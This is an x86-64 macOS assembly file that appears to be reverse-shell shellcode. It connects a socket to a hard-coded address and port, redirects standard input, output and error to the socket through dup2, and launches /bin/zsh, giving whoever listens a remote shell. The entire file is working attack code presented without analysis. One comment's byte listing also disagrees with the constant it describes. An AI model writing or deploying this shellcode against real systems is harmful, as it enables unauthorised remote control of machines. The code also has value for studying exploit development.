bits 64

global start

start:
   ; socket(AF_INET, SOCK_STREAM,0);
   push 0x2             ; Store 0x2 on stack
   pop rdi              ; pop this value into rdi -> AF_INET

   push 0x1             ; Store 0x1 on stack
   pop rsi              ; pop this value into rsi -> SOCK_STREAM

   xor rdx,rdx          ; Null out rdx -> 0x00

   push 97              ; socket() syscall - 97
   pop rax
   bts rax,25
   syscall

   mov r9,rax           ; save socket fd in r9

   ; connect(sockt, (struct sockaddr *) &revsockaddr,sizeof(revsockaddr));
   mov rdi,r9           ; rdi -> socket file descriptor

   ; sockaddr
   xor rsi,rsi          ; null out rsi
   push rsi             ; sin_zero

   mov rsi,0x0100007F5C110201 ; 0x01 0x02 0x11 0x5C 0x0A 0x00 0x02 0x02
   dec rsi              ; sin_len = 0x00 после декремента
   push rsi
   push rsp
   pop rsi

   ;; sizeof(addr)
   push 0x10            ; Place 0x10 (16) on stack
   pop rdx              ; rdx -> sizeof struct -> 16 bytes -> 0x10

   ;; syscall connect()
   push 98             ; connect() syscall - 98
   pop rax
   bts rax,25
   syscall


   ; dup2(connfd,i)
   mov rdi,r9          ; rdi -> Socket file descriptor from r9
   push 2
   pop rsi              ; rsi -> 2
dup2_loop:
   push 90              ; dup2() syscall - 90
   pop rax
   bts rax,25
   syscall

   dec rsi              ; decrementing rsi by 1
   jns dup2_loop        ; Jump back to dup2_loop if rsi>=0

   ; execve("/bin/zsh", "/bin/zsh", NULL);
   xor rdx,rdx          ; rdx -> NULL

   push rdx             ; Store NULL on stack
   mov rbx,'/bin/zsh'   ; Store /bin/zsh in rbx
   push rbx             ; push it onto the stack
   mov rdi,rsp          ; rdi -> /bin/zsh

   push rdx             ; argv[1] -> NULL
   push rdi             ; argv[0] -> /bin/zsh
   mov rsi,rsp          ; Store {"/bin/zsh",NULL} in rsi

   push 59              ; execve() syscall - 59
   pop rax
   bts rax,25
   syscall
